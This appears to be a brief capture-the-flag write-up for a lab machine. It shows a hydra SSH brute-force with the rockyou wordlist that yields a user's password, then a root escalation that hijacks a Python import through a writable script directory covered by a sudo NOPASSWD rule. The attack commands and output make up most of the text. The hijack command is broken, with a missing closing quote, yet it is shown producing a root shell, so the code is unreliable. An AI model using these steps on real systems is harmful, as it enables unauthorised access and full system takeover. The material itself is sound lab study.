Usernames:

meliodas
anonymous

cracked ssh password

```console
$ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.49.144.230 ssh           

[22][ssh] host: 10.49.144.230   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
```

priv esc

```
$ sudo -l
(ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py

$ # cat /home/meliodas/bak.py 
#!/usr/bin/env python
import os
import zipfile

...
```

When a Python script is executed, Python automatically adds the directory containing the script (in this case, `/home/meliodas/`) to the very beginning of its module search path (sys.path). This means it will look in /home/meliodas/ for imported libraries before checking the actual system libraries.


Create a fake library file in the same directory named zipfile.py:

```
$ echo "import os; os.system('/bin/bash)" > zipfile.py
$ sudo python3 /home/meliodas/bak.py
# id
uid=0(root) gid=0(root) groups=0(root)
```
